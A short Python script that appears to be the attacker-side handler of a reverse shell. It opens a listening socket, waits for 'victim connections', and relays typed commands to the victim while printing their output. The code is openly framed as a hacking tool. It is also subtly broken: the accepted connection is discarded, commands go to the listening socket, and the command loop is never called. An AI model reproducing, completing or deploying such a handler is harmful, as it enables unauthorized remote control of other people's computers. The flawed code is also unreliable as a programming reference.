import socket

def create_socket():
    hacker_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    ip,port = "", 0
    socket_address=(ip,port)
    hacker_socket.bind(socket_address)
    hacker_socket.listen(5)

    return hacker_socket

def start_connection(hacker_socket:socket.socket):
    print("[+] Listening for victim connections.")
    hacker_socket, client_address = hacker_socket.accept()

def transmit_commands(hacker_socket:socket.socket):
    start_connection(hacker_socket)
    try:
        while True:
            command = input("[+] Enter Command:\n")
            hacker_socket.send(command.encode())
            command_result = hacker_socket.recv(1048)
            print(command_result.decode())
    except KeyboardInterrupt:
        print("\n[-] Ctrl+C detected.")
        hacker_socket.close()
        print("[+] Connection to victim closed.")

def main():
    hacker_socket = create_socket()
    start_connection(hacker_socket)
    

if __name__ == "__main__":
    main()